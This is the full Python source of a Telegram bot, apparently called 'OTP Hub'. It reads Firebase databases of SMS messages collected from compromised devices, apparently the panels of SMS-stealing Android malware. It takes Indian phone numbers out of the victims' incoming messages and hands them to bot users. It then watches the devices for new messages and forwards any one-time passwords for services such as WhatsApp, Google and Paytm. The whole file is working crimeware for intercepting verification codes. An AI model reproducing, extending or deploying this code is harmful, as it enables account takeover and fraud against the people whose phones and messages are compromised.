import asyncio, json, os, time, logging, random, re, base64
import aiohttp
from aiohttp import web
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
log = logging.getLogger("OTP-Bot")

# ================= CONFIGURATION =================
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_MAIN_BOT_TOKEN")
OWNER_ID = 8480878371
DATA_FILE = "data.json"
PORT = int(os.getenv("PORT", 8080))
# =================================================

router = Router()

# ================= DATA MANAGEMENT =================
def load_data():
    if not os.path.exists(DATA_FILE):
        default_data = {
            "owner_id": OWNER_ID,
            "admins": [],
            "firebases": [], 
            "users": {},     
            "free_mode": True,
            "user_leases": {}, 
            "user_history": {},
            "stats": {"total_otps": 0}
        }
        with open(DATA_FILE, "w") as f:
            json.dump(default_data, f, indent=4)
        return default_data
    with open(DATA_FILE, "r") as f:
        return json.load(f)

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

def clean_old_history(data):
    now = time.time()
    for uid in list(data["user_history"].keys()):
        data["user_history"][uid] = {k: v for k, v in data["user_history"][uid].items() if now - v < 86400}
        if not data["user_history"][uid]:
            del data["user_history"][uid]
    return data

# ================= FIREBASE HELPERS =================
async def fetch_fb(url, auth=None):
    full_url = url
    if auth:
        full_url += f"?auth={auth}" if "?" not in full_url else f"&auth={auth}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(full_url, timeout=10) as resp:
                if resp.status == 200:
                    txt = await resp.text()
                    if txt == "null" or not txt: return {}
                    return json.loads(txt)
    except Exception:
        pass
    return None

def decode_panel_url(panel_url):
    match = re.search(r'([A-Za-z0-9+/=]{20,})', panel_url)
    if not match: return None
    b64_str = match.group(1)
    try:
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        decoded = base64.b64decode(b64_str).decode('utf-8')
        if "|||" in decoded:
            return decoded.split("|||")[0], ""
        try:
            data = json.loads(decoded)
            if isinstance(data, dict) and "url" in data:
                return data["url"], data.get("key", "")
        except json.JSONDecodeError:
            if decoded.startswith("http"):
                return decoded, ""
    except Exception:
        pass
    return None

def extract_otp(text):
    if not any(k in text.lower() for k in ["otp", "code", "verification", "login", "pin", "password"]):
        return None
    match = re.search(r'\b(\d{4,8})\b', text)
    return match.group(1) if match else None

def extract_service_name(text, sender):
    text_lower = text.lower()
    known_services = {
        "whatsapp": "WhatsApp", "facebook": "Facebook", "instagram": "Instagram",
        "telegram": "Telegram", "google": "Google", "amazon": "Amazon",
        "flipkart": "Flipkart", "swiggy": "Swiggy", "zomato": "Zomato",
        "paytm": "Paytm", "phonepe": "PhonePe", "creditt": "Creditt",
        "ram fincorp": "Ram Fincorp", "jio": "Jio", "airtel": "Airtel"
    }
    for key, name in known_services.items():
        if key in text_lower:
            return name
    if sender:
        parts = sender.split("-")
        if len(parts) > 1:
            return parts[1]
    return "Unknown Service"

# ================= STATES =================
class AdminStates(StatesGroup):
    select_country_add = State()
    add_fb = State()

# ================= CORE FUNCTIONS =================
async def get_owner_stats():
    data = load_data()
    fbs = data.get("firebases", [])
    
    total_devices = 0
    online_devices = 0
    fb_stats = {}
    
    for fb in fbs:
        clients = await fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        fb_online = 0
        if clients and isinstance(clients, dict):
            total_devices += len(clients)
            for dev_id, dev_data in clients.items():
                if isinstance(dev_data, dict) and dev_data.get("status") is True:
                    fb_online += 1
                    online_devices += 1
        
        label = fb['label']
        if label not in fb_stats: fb_stats[label] = {"total": 0, "online": 0}
        fb_stats[label]["total"] += len(clients) if clients else 0
        fb_stats[label]["online"] += fb_online

    return {
        "total_fbs": len(fbs),
        "total_devices": total_devices,
        "online_devices": online_devices,
        "total_users": len(data.get("users", {})),
        "total_otps": data.get("stats", {}).get("total_otps", 0),
        "fb_stats": fb_stats
    }

async def get_numbers_for_country(country_label, uid):
    data = load_data()
    data = clean_old_history(data)
    save_data(data)
    
    valid_fbs = [f for f in data.get("firebases", []) if f["label"] == country_label]
    if not valid_fbs: return []

    online_devices = []
    for fb in valid_fbs:
        clients = await fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        if clients:
            for dev_id, dev_data in clients.items():
                if isinstance(dev_data, dict) and dev_data.get("status") is True:
                    online_devices.append((fb, dev_id))

    if not online_devices:
        return []

    # Pick ONE random device from the available online devices
    selected_fb, selected_dev_id = random.choice(online_devices)
    
    # Fetch messages to find real numbers
    numbers = set()
    msgs = await fetch_fb(f"{selected_fb['url']}/messages/{selected_dev_id}.json", selected_fb.get("auth"))
    
    if msgs:
        for k, v in msgs.items():
            if isinstance(v, dict) and v.get("type") == "incoming":
                body = v.get("message", "")
                # Regex to find real 10-digit Indian numbers (starting with 6-9)
                found_nums = re.findall(r'\b[6-9]\d{9}\b', body)
                for n in found_nums:
                    if len(n) == 10:
                        numbers.add(n)
                                
    user_hist = data.get("user_history", {}).get(str(uid), {})
    available = [n for n in numbers if n not in user_hist]
    random.shuffle(available)
    
    return available[:3]

async def get_latest_messages_for_fb(fb_url, auth):
    all_msgs = {}
    clients = await fetch_fb(f"{fb_url}/clients.json", auth)
    if not clients: return all_msgs
    
    for dev_id in clients.keys():
        msgs = await fetch_fb(f"{fb_url}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", auth)
        if msgs:
            for k, v in msgs.items():
                if isinstance(v, dict) and v.get("type") == "incoming":
                    if int(v.get("id", 0)) > all_msgs.get(dev_id, {}).get("id", 0):
                        all_msgs[dev_id] = v
    return all_msgs

# ================= BACKGROUND SCANNER & WEB SERVER =================
active_scans = {} 

async def background_global_scanner(main_bot: Bot):
    log.info("Global Scanner Started...")
    while True:
        try:
            data = load_data()
            fbs = data.get("firebases", [])
            leases = data.get("user_leases", {})
            
            number_to_users = {}
            current_time = time.time()
            for uid, lease in leases.items():
                if current_time < lease["expire_at"]:
                    for num in lease["numbers"]:
                        clean_num = re.sub(r'\D', '', num)[-10:]
                        number_to_users.setdefault(clean_num, []).append(uid)
            
            if not number_to_users:
                await asyncio.sleep(5)
                continue 
                
            otps_sent = 0
            for fb in fbs:
                latest_msgs = await get_latest_messages_for_fb(fb["url"], fb.get("auth"))
                for dev_id, msg in latest_msgs.items():
                    key = (fb["url"], dev_id)
                    msg_id = int(msg.get("id", 0))
                    old_id = active_scans.get(key, 0)
                    
                    if msg_id > old_id:
                        active_scans[key] = msg_id
                        if old_id != 0: 
                            text_content = msg.get("message", "")
                            otp = extract_otp(text_content)
                            if otp:
                                # Determine which number got the OTP
                                found_nums = re.findall(r'\b[6-9]\d{9}\b', text_content)
                                target_numbers = [re.sub(r'\D', '', n)[-10:] for n in found_nums]
                                
                                for num, users in number_to_users.items():
                                    if num in target_numbers:
                                        service = extract_service_name(text_content, msg.get("sender", ""))
                                        for uid in users:
                                            otp_msg = (
                                                f"🔔 <b>OTP Received!</b>\n\n"
                                                f"📞 <b>Number:</b> <code>+{num}</code>\n"
                                                f"📱 <b>Service:</b> {service}\n"
                                                f"🔑 <b>OTP:</b> {otp}\n\n"
                                                f"💬 <b>Msg:</b> {text_content[:100]}..."
                                            )
                                            kb = InlineKeyboardMarkup(inline_keyboard=[
                                                [InlineKeyboardButton(text=f"📋 {otp}", copy_text=CopyTextButton(text=otp))]
                                            ])
                                            try:
                                                await main_bot.send_message(uid, otp_msg, reply_markup=kb, parse_mode="HTML")
                                                otps_sent += 1
                                            except Exception:
                                                pass
            if otps_sent > 0:
                d = load_data()
                d.setdefault("stats", {})["total_otps"] = d.get("stats", {}).get("total_otps", 0) + otps_sent
                save_data(d)
                
            await asyncio.sleep(5)
        except Exception as e:
            log.error(f"Scanner Error: {e}")
            await asyncio.sleep(10)

async def web_server():
    app = web.Application()
    app.router.add_get('/', lambda r: web.Response(text="Bot is running!"))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    log.info(f"Web server started on port {PORT}")

# ================= KEYBOARDS =================
def main_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Get Number", callback_data="user:get_num")],
        [InlineKeyboardButton(text="📜 My Numbers", callback_data="user:account")]
    ])

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Enter as User (Test)", callback_data="user:home")],
        [InlineKeyboardButton(text="➕ Add URL", callback_data="admin:addurl")],
        [InlineKeyboardButton(text="👥 Users", callback_data="admin:users"), InlineKeyboardButton(text="📢 Broadcast", callback_data="admin:broadcast")],
        [InlineKeyboardButton(text="🔄 Refresh Panel", callback_data="admin:home")]
    ])

# ================= HANDLERS =================
@router.message(CommandStart())
async def cmd_start(msg: Message):
    data = load_data()
    uid = msg.from_user.id
    
    if str(uid) not in data["users"]:
        data["users"][str(uid)] = {"name": msg.from_user.full_name, "joined": int(time.time())}
        save_data(data)
    
    if uid == data["owner_id"] or uid in data.get("admins", []):
        try: await msg.answer("⏳ <i>Loading analytics...</i>", parse_mode="HTML")
        except TelegramBadRequest: pass
        await admin_home_msg(msg)
    else:
        if not data.get("free_mode", True):
            await msg.answer("⛔ Access Denied.")
            return
        await msg.answer("👋 <b>Welcome to OTP Hub!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")

async def admin_home_msg(msg: Message):
    stats = await get_owner_stats()
    text = (
        f"👑 <b>Owner Analytics Dashboard</b>\n\n"
        f"🔥 <b>Firebase DBs:</b> {stats['total_fbs']}\n"
        f"📱 <b>Total Devices:</b> {stats['total_devices']}\n"
        f"🟢 <b>Online Devices:</b> {stats['online_devices']}\n"
        f"👥 <b>Total Users:</b> {stats['total_users']}\n"
        f"🔔 <b>Total OTPs Sent:</b> {stats['total_otps']}\n\n"
        f"<b>Per Country Stats:</b>\n"
    )
    for label, fstats in stats["fb_stats"].items():
        text += f"🌍 {label}: {fstats['online']} ONLINE / {fstats['total']} Total\n"
        
    try: await msg.answer(text, reply_markup=admin_kb(), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "admin:home")
async def admin_home_cb(cq: CallbackQuery):
    await cq.message.edit_text("🔄 Refreshing live analytics...")
    stats = await get_owner_stats()
    text = (
        f"👑 <b>Owner Analytics Dashboard</b>\n\n"
        f"🔥 <b>Firebase DBs:</b> {stats['total_fbs']}\n"
        f"📱 <b>Total Devices:</b> {stats['total_devices']}\n"
        f"🟢 <b>Online Devices:</b> {stats['online_devices']}\n"
        f"👥 <b>Total Users:</b> {stats['total_users']}\n"
        f"🔔 <b>Total OTPs Sent:</b> {stats['total_otps']}\n\n"
        f"<b>Per Country Stats:</b>\n"
    )
    for label, fstats in stats["fb_stats"].items():
        text += f"🌍 {label}: {fstats['online']} ONLINE / {fstats['total']} Total\n"
    try: await cq.message.edit_text(text, reply_markup=admin_kb(), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "admin:addurl")
async def admin_addurl_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.select_country_add)
    await cq.message.edit_text("🌍 Enter the Country Name (e.g., `Sri Lanka`):", parse_mode="Markdown")

@router.message(AdminStates.select_country_add)
async def admin_select_country(msg: Message, state: FSMContext):
    await state.update_data(country_label=msg.text.strip())
    await state.set_state(AdminStates.add_fb)
    await msg.answer(f"Now send the URL for <b>{msg.text.strip()}</b>:\n\nFormat: `URL` or `Panel URL`", parse_mode="HTML")

@router.message(AdminStates.add_fb)
async def admin_addurl_done(msg: Message, state: FSMContext):
    data_fsm = await state.get_data()
    label = data_fsm.get("country_label", "Unknown")
    await state.clear()
    
    text = msg.text.strip()
    final_url, auth = text, ""
    
    if "#DARKs=" in text or "?s=" in text:
        decoded = decode_panel_url(text)
        if decoded: final_url, auth = decoded
        else: return await msg.answer("❌ Could not decode Panel URL.")

    data = load_data()
    data["firebases"].append({"url": final_url, "auth": auth, "label": label})
    save_data(data)
    try: await msg.answer(f"✅ URL added successfully for <b>{label}</b>!", reply_markup=admin_kb(), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "user:home")
async def user_home(cq: CallbackQuery):
    try: await cq.message.edit_text("👋 <b>Welcome!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "user:get_num")
async def user_get_num(cq: CallbackQuery):
    data = load_data()
    countries = list(set([fb["label"] for fb in data.get("firebases", [])]))
    if not countries: return await cq.message.edit_text("❌ No countries available right now.")
        
    kb = [[InlineKeyboardButton(text=f"🌍 {c}", callback_data=f"country:{c}")] for c in countries]
    kb.append([InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")])
    try: await cq.message.edit_text("🌍 <b>Select a Country:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("country:"))
async def user_country_selected(cq: CallbackQuery):
    country = cq.data.split(":")[1]
    uid = cq.from_user.id
    await cq.message.edit_text(f"🔄 Fetching numbers for {country}...")
    numbers = await get_numbers_for_country(country, uid)
    
    if not numbers:
        kb = [[InlineKeyboardButton(text="🔄 Next Number", callback_data=f"country:{country}")],[InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
        try: await cq.message.edit_text(f"❌ <b>Not available in range!</b>\n\nNo real SIM numbers found on this device. Try refreshing.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
        except TelegramBadRequest: pass
        return
        
    nums_text = "\n".join([f"<code>+91{n}</code>" for n in numbers])
    text = f"📱 <b>Numbers Received</b>\nCountry: 🌍 {country}\nQty: {len(numbers)}\n\n{nums_text}\n\n⌛ <i>Waiting for OTP (1 Hour)...</i>"
    
    data = load_data()
    data["user_leases"][str(uid)] = {"numbers": numbers, "country": country, "expire_at": int(time.time()) + 3600}
    data["user_history"].setdefault(str(uid), {})
    for n in numbers: data["user_history"][str(uid)][n] = int(time.time())
    save_data(data)
    
    kb = [[InlineKeyboardButton(text="🔄 Next Number", callback_data=f"country:{country}")],[InlineKeyboardButton(text="🔙 Back", callback_data="user:get_num"), InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "user:account")
async def user_account(cq: CallbackQuery):
    uid = cq.from_user.id
    data = load_data()
    lease = data.get("user_leases", {}).get(str(uid))
    text = "⚙️ <b>My Numbers</b>\n\n"
    if lease and time.time() < lease["expire_at"]:
        rem = int((lease["expire_at"] - time.time()) / 60)
        text += f"🌍 Active: <b>{lease['country']}</b>\n⏳ Expires in: {rem} minutes\n📱 Numbers:\n`{chr(10).join(lease['numbers'])}`"
    else: text += "❌ No active numbers."
    kb = [[InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

async def main():
    log.info("Bot Started!")
    await web_server() 
    
    main_bot = Bot(token=BOT_TOKEN)
    asyncio.create_task(background_global_scanner(main_bot))
    
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    await dp.start_polling(main_bot)

if __name__ == "__main__":
    asyncio.run(main())
